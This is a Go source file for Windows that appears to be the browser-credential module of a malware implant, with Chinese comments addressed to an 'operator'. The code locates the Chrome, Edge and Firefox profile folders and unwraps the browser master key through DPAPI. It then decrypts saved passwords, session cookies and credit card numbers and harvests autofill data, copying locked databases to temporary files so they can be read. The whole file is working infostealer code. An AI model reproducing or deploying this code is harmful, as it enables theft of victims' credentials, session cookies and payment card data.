//go:build windows

package services

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"

	"implant/core/debuglog"
	"implant/core/sqlite"
)

// 浏览器凭据采集的 Windows 驱动：定位配置目录 → 解主密钥 → 读 SQLite →
// 解密口令/Cookie → 汇总制品。
//
// 读库策略：先用 os.Open 直读（Windows 上 Go 的 os.Open 是共享读打开，
// 浏览器正在运行也能读）；失败（被独占/权限）再复制一份到 %TEMP% 读副本，
// 读完删副本。副本只包含**密文**，不是明文落盘。
type browserTarget struct {
	name string // chrome / edge
	root string // User Data 目录
}

// browserRoots 返回本机可能存在的浏览器 User Data 目录
func browserRoots() []browserTarget {
	local := os.Getenv("LOCALAPPDATA")
	if local == "" {
		return nil
	}
	cands := []browserTarget{
		{name: "chrome", root: filepath.Join(local, "Google", "Chrome", "User Data")},
		{name: "edge", root: filepath.Join(local, "Microsoft", "Edge", "User Data")},
	}
	out := make([]browserTarget, 0, len(cands))
	for _, c := range cands {
		if st, err := os.Stat(c.root); err == nil && st.IsDir() {
			out = append(out, c)
		}
	}
	return out
}

// collectBrowserCredentials 采集指定浏览器（tech: all/chrome/edge/firefox）的口令与 Cookie，
// 返回制品。单个配置失败只记入 Errors，不影响其它配置 —— 现场常见"Edge 没装、
// Chrome 主密钥解不开"，整条任务因此失败对操作员毫无帮助。
func collectBrowserCredentials(tech string) (CollectedBrowserArtifact, error) {
	art := CollectedBrowserArtifact{
		Host: hostnameOrEmpty(),
		User: os.Getenv("USERNAME"),
	}
	if art.Host == "" {
		art.Host = "unknown"
	}

	tech = strings.ToLower(strings.TrimSpace(tech))

	// 技术白名单：服务端只下发 all/chrome/edge/firefox/cards，客户端也自己守一遍 ——
	// 拼错的值若落进下面的过滤逻辑，会表现为"不过滤"，静默采集了两家的数据，
	// 与操作员的选择不符（行为不可预测比直接报错更糟）。
	switch tech {
	case "all", "chrome", "edge", "firefox", "cards":
	default:
		return art, fmt.Errorf("不支持的浏览器技术: %s（可选 all/chrome/edge/firefox/cards）", tech)
	}

	// Chromium 系（chrome / edge）：User Data + DPAPI 主密钥 + AES-GCM。
	// firefox 不走这条链路（NSS 结构完全不同），见下面的 Firefox 分支。
	// cards 是 Chromium 的 `Web Data`（信用卡 + 自动填充）：只读 Web Data，
	// 不碰 Login Data/Cookies —— 单独开关，混进 all 会把噪声带进每一次采集。
	if tech != "firefox" {
		mode := collectModeAll
		if tech == "cards" {
			mode = collectModeWebData
		}
		roots := browserRoots()
		if tech == "chrome" || tech == "edge" {
			filtered := make([]browserTarget, 0, len(roots))
			for _, r := range roots {
				if r.name == tech {
					filtered = append(filtered, r)
				}
			}
			roots = filtered
			// 明确点名了某个浏览器却没有目录：这是操作员的配置错误，直接失败
			if len(roots) == 0 {
				return art, fmt.Errorf("未发现可用的 %s 配置目录", tech)
			}
		}
		for _, target := range roots {
			profiles, err := collectFromUserDataDir(target, mode)
			if err != nil {
				art.Errors = append(art.Errors, fmt.Sprintf("%s: %v", target.name, err))
				continue
			}
			art.Browsers = append(art.Browsers, profiles...)
		}
	}

	// Firefox（NSS）：logins.json 加密、cookies.sqlite 明文。
	// tech=all 时与 Chromium 并行采集；没装 Firefox 只会往 Errors 里记一条。
	if tech == "all" || tech == "firefox" {
		profs, errs := collectFirefoxProfiles()
		art.Browsers = append(art.Browsers, profs...)
		art.Errors = append(art.Errors, errs...)
	}

	if len(art.Browsers) == 0 {
		return art, fmt.Errorf("所有浏览器配置都采集失败（见 errors）")
	}
	return art, nil
}

// 采集模式：all = 口令 + Cookie；webData = 只读 Web Data（信用卡 + 自动填充）
type collectMode int

const (
	collectModeAll collectMode = iota
	collectModeWebData
)

// collectFromUserDataDir 处理一个浏览器的 User Data 目录（多配置）
func collectFromUserDataDir(target browserTarget, mode collectMode) ([]CollectedProfile, error) {
	entries, err := os.ReadDir(target.root)
	if err != nil {
		return nil, fmt.Errorf("读取 User Data 失败: %w", err)
	}

	// 主密钥在 User Data/Local State 里（所有配置共用）
	masterKey, err := loadBrowserMasterKey(filepath.Join(target.root, "Local State"))
	if err != nil {
		return nil, err // 主密钥解不开时该浏览器整体不可用，直接上报
	}
	keyB64 := encodeB64(masterKey)

	var out []CollectedProfile
	for _, e := range entries {
		if !e.IsDir() || !isProfileDir(e.Name()) {
			continue
		}
		dir := filepath.Join(target.root, e.Name())
		prof := CollectedProfile{
			Name: target.name, Profile: e.Name(), UserDataDir: dir,
			Tech: "v10/v20", MasterKey: keyB64,
		}

		if mode == collectModeWebData {
			// 卡号同样是 v10/v20 密文，复用同一把浏览器主密钥；自动填充是明文
			prof.Tech = "v10/v20 (Web Data)"
			cards, autofill, werr := readWebData(filepath.Join(dir, "Web Data"), masterKey, target.name, e.Name())
			if werr != nil {
				// 单个配置读失败不影响其它配置；errors 由调用方按浏览器粒度汇总
				prof.Cards, prof.Autofill = nil, nil
			} else {
				prof.Cards, prof.Autofill = cards, autofill
			}
			if len(prof.Cards) == 0 && len(prof.Autofill) == 0 {
				continue // 没卡也没自动填充（很常见），不占制品
			}
			out = append(out, prof)
			continue
		}

		creds, cerr := readLoginData(filepath.Join(dir, "Login Data"), masterKey, target.name, e.Name())
		if cerr != nil {
			prof.Credentials = nil
		} else {
			prof.Credentials = creds
		}

		cookies, kerr := readCookies(filepath.Join(dir, "Network", "Cookies"), masterKey, target.name, e.Name())
		if kerr != nil {
			cookies = nil
		}
		prof.Cookies = cookies

		if (cerr != nil || kerr != nil) && len(prof.Credentials) == 0 && len(prof.Cookies) == 0 {
			// 该配置确实没东西（新装浏览器很常见），不算错误
			continue
		}
		if len(prof.Credentials) > maxCredentialItems {
			prof.Credentials = prof.Credentials[:maxCredentialItems]
		}
		if len(prof.Cookies) > maxCookieItems {
			prof.Cookies = prof.Cookies[:maxCookieItems]
		}
		out = append(out, prof)
	}
	if len(out) == 0 {
		return nil, fmt.Errorf("没有可用的配置目录（或全部为空）")
	}
	return out, nil
}

// loadBrowserMasterKey 读 Local State → DPAPI 解出 32 字节 AES 密钥
func loadBrowserMasterKey(localStatePath string) ([]byte, error) {
	raw, err := readFileShared(localStatePath)
	if err != nil {
		return nil, fmt.Errorf("读取 Local State 失败: %w", err)
	}
	_, protected, err := decodeLocalStateKey(raw)
	if err != nil {
		return nil, err
	}
	key, err := cryptUnprotect(protected)
	if err != nil {
		return nil, fmt.Errorf("DPAPI 解浏览器主密钥失败（多半是换了用户上下文）: %w", err)
	}
	if len(key) != 32 {
		return nil, fmt.Errorf("浏览器主密钥长度异常: %d（期望 32）", len(key))
	}
	return key, nil
}

// readLoginData 读 `Login Data` 的 logins 表并解密口令
func readLoginData(path string, key []byte, browser, profile string) ([]CollectedCredential, error) {
	db, cleanup, err := openBrowserDB(path)
	if err != nil {
		return nil, err
	}
	defer cleanup()

	tb, err := db.Table("logins")
	if err != nil {
		return nil, err
	}
	rows, err := tb.Rows(nil)
	if err != nil {
		return nil, err
	}

	out := make([]CollectedCredential, 0, len(rows))
	for _, r := range rows {
		url := stringValue(r["origin_url"])
		if strings.TrimSpace(url) == "" {
			continue
		}
		blob := bytesValue(r["password_value"])
		if len(blob) == 0 {
			continue
		}
		plain, derr := decryptChromiumBlob(key, blob)
		if derr != nil {
			debuglog.Printf("⚠️ [BROWSER] %s/%s 口令解密失败(%s): %v\n", browser, profile, url, derr)
			continue
		}
		out = append(out, CollectedCredential{
			URL: url, User: stringValue(r["username_value"]), Pass: string(plain),
			Browser: browser, Profile: profile, Created: intValue(r["date_created"]),
		})
		if len(out) >= maxCredentialItems {
			break
		}
	}
	return out, nil
}

// readCookies 读 `Network/Cookies` 的 cookies 表并解密 Cookie 值
func readCookies(path string, key []byte, browser, profile string) ([]CollectedCookie, error) {
	db, cleanup, err := openBrowserDB(path)
	if err != nil {
		return nil, err
	}
	defer cleanup()

	tb, err := db.Table("cookies")
	if err != nil {
		return nil, err
	}
	rows, err := tb.Rows(nil)
	if err != nil {
		return nil, err
	}

	out := make([]CollectedCookie, 0, len(rows))
	for _, r := range rows {
		name := stringValue(r["name"])
		host := stringValue(r["host_key"])
		if name == "" || host == "" {
			continue
		}
		// 新版 Chromium 把值放 encrypted_value；老库或某些条目只有 value 字段
		val := stringValue(r["value"])
		if blob := bytesValue(r["encrypted_value"]); len(blob) > 0 {
			if plain, derr := decryptChromiumBlob(key, blob); derr == nil {
				val = string(plain)
			} else if val == "" {
				continue // 没有可用的值，跳过而不是写空
			}
		}
		if val == "" {
			continue
		}
		out = append(out, CollectedCookie{
			Host: host, Name: name, Value: val,
			Path:     stringValue(r["path"]),
			Expires:  intValue(r["expires_utc"]),
			Secure:   intValue(r["is_secure"]) != 0,
			HTTPOnly: intValue(r["is_httponly"]) != 0,
		})
		if len(out) >= maxCookieItems {
			break
		}
	}
	return out, nil
}

// openBrowserDB 打开浏览器库：直读优先，失败则复制副本再读（读完删副本）。
// 副本里只有密文，不违反"明文不落盘"。
func openBrowserDB(path string) (*sqlite.DB, func(), error) {
	if _, err := os.Stat(path); err != nil {
		return nil, func() {}, fmt.Errorf("库不存在: %s", filepath.Base(path))
	}
	if db, err := sqlite.Open(path); err == nil {
		return db, func() { _ = db.Close() }, nil
	} else {
		debuglog.Printf("ℹ️ [BROWSER] 直读 %s 失败(%v)，改用临时副本\n", filepath.Base(path), err)
	}

	tmp := filepath.Join(os.TempDir(), fmt.Sprintf("ts-%d-%s", os.Getpid(), filepath.Base(path)))
	if err := copyFile(path, tmp); err != nil {
		return nil, func() {}, fmt.Errorf("复制库副本失败: %w", err)
	}
	db, err := sqlite.Open(tmp)
	if err != nil {
		_ = os.Remove(tmp)
		return nil, func() {}, err
	}
	return db, func() {
		_ = db.Close()
		_ = os.Remove(tmp)
		_ = os.Remove(tmp + "-wal")
	}, nil
}

// readFileShared 读一个可能被浏览器独占的文件：直读失败时复制副本再读
func readFileShared(path string) ([]byte, error) {
	if raw, err := os.ReadFile(path); err == nil {
		return raw, nil
	}
	tmp := filepath.Join(os.TempDir(), fmt.Sprintf("ts-%d-%s", os.Getpid(), filepath.Base(path)))
	if err := copyFile(path, tmp); err != nil {
		return nil, err
	}
	defer func() { _ = os.Remove(tmp) }()
	return os.ReadFile(tmp)
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	if _, err := io.Copy(out, in); err != nil {
		out.Close()
		_ = os.Remove(dst)
		return err
	}
	return out.Close()
}

func hostnameOrEmpty() string {
	h, err := os.Hostname()
	if err != nil {
		return ""
	}
	return h
}

// readWebData 读 Chromium 的 `Web Data`：信用卡（卡号加密）+ 自动填充（明文）。
//
// 两张表任一缺失都不算错误（老版本或用户从没存过）：另一张照常采。
// 卡号解密失败逐条跳过并记日志 —— 与口令同样的取舍，不因为一张卡解不开丢掉整份。
func readWebData(path string, key []byte, browser, profile string) ([]CollectedCard, []CollectedAutofill, error) {
	db, cleanup, err := openBrowserDB(path)
	if err != nil {
		return nil, nil, err
	}
	defer cleanup()

	var cards []CollectedCard
	if tb, terr := db.Table("credit_cards"); terr == nil {
		rows, rerr := tb.Rows(nil)
		if rerr != nil {
			debuglog.Printf("⚠️ [BROWSER] %s/%s credit_cards 读取失败: %v\n", browser, profile, rerr)
		}
		cards = cardsFromRows(rows, key, browser, profile)
	}

	var autofill []CollectedAutofill
	if tb, terr := db.Table("autofill"); terr == nil {
		rows, rerr := tb.Rows(nil)
		if rerr != nil {
			debuglog.Printf("⚠️ [BROWSER] %s/%s autofill 读取失败: %v\n", browser, profile, rerr)
		}
		autofill = autofillFromRows(rows)
	}

	if len(cards) == 0 && len(autofill) == 0 {
		return nil, nil, fmt.Errorf("Web Data 里没有信用卡或自动填充条目")
	}
	debuglog.Printf("🔑 [BROWSER] %s/%s Web Data: %d 张卡 / %d 条自动填充\n",
		browser, profile, len(cards), len(autofill))
	return cards, autofill, nil
}
